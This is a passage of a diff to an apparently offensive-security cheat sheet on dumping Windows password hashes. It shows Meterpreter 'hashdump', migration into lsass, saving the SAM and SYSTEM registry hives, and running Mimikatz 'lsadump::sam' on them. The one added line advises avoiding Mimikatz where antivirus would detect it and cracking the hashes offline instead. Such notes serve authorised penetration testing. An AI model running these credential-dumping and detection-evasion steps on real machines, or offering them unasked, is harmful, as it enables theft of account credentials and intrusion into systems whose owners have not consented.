@@ -50,6 +50,7 @@ Meterpreter shell: need to migrate to lsass process to dump hashes, due to proce
     meter > hashdump     
     
 ### Dump Hives and Extract with Mimikatz     
+AV products will flag on Mimikatz so only do this if you are sure if won't (otherwise crack the hashes locally).     
 
     C:\Temp> reg save hklm\sam sam.hive && reg save hklm\system system.hiv     
     C:\Temp> c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv /system:system.hiv" "exit"   
